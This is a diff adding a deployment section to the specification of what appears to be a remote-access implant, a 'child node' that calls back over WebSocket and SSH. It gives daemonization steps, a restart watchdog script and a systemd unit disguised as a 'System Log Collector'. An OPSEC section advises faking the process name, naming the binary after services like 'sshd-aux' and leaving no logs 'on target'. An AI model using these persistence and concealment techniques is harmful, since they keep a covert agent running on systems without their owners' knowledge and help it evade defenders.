@@ -286,3 +286,79 @@ asyncio.run(test())
 ```
 
 If this fails, check: host reachable, PSK correct, WebSocket library masks frames correctly.
+
+## 12. Deployment & Daemonization
+
+A child node MUST run persistently in the background and survive terminal logout, SSH disconnect, and process crashes.
+
+### Option A: Self-Daemonizing (Recommended)
+
+The child SHOULD daemonize itself at startup, avoiding external tool dependencies:
+
+1. **Double-fork**: `fork()` → parent exits → child `fork()` → grandchild is the daemon
+2. **setsid()**: Detach from controlling terminal
+3. **chdir("/")**: Avoid holding mount points
+4. **Close stdio**: Redirect stdin/stdout/stderr to `/dev/null`
+5. **Signal handlers**: `SIGTERM`/`SIGINT` → graceful shutdown (close WS, kill SSH tunnel)
+
+The Go reference implementation (`cmd/child/main.go`) does NOT self-daemonize — it relies on external tools. A self-daemonizing mode is a TODO.
+
+### Option B: External Process Supervisor
+
+If the child doesn't self-daemonize, use one of:
+
+| Tool | Command | Notes |
+|------|---------|-------|
+| **systemd** | `systemctl enable --now child` | Best for servers — auto-restart, logging |
+| **nohup** | `nohup ./child &>/dev/null &` | Simplest, survives SIGHUP only |
+| **screen** | `screen -dmS child ./child` | Detachable terminal, reattach with `screen -r` |
+| **tmux** | `tmux new -d -s child './child'` | Same as screen, modern alternative |
+| **supervisord** | `[program:child]` config | Process manager with web UI |
+
+### Option C: Watchdog Wrapper (Crash Recovery)
+
+If the language runtime is unstable (e.g., Python with memory leaks), wrap in a restart loop:
+
+```bash
+#!/bin/bash
+# watchdog.sh — restart child on crash with backoff
+BACKOFF=1
+while true; do
+    ./child
+    echo "[watchdog] child exited, restarting in ${BACKOFF}s"
+    sleep $BACKOFF
+    BACKOFF=$(( BACKOFF < 60 ? BACKOFF * 2 : 60 ))
+done
+```
+
+**Note**: The child already has internal reconnect logic for WebSocket drops. The watchdog is for PROCESS crashes (segfault, OOM, uncaught exception). Don't confuse the two — if WebSocket drops but process stays alive, the child's own backoff handles it.
+
+### OPSEC Considerations
+
+- **Process name**: Disguise `argv[0]` (Go child does this via `reflect.StringHeader`)
+- **Binary name**: Name it after a common service (`/usr/bin/node`, `nginx-helper`, `sshd-aux`)
+- **Ports**: Only outbound connections (WebSocket + optional SSH), no listening ports
+- **Files**: Write nothing to disk unless necessary (no log files on target)
+
+### systemd Unit Example
+
+```ini
+[Unit]
+Description=System Log Collector
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/logcollector
+Restart=always
+RestartSec=10
+User=nobody
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Key: `Restart=always` + `RestartSec=10` gives crash recovery at the OS level. The `After=network-online.target` ensures network is up before connecting.
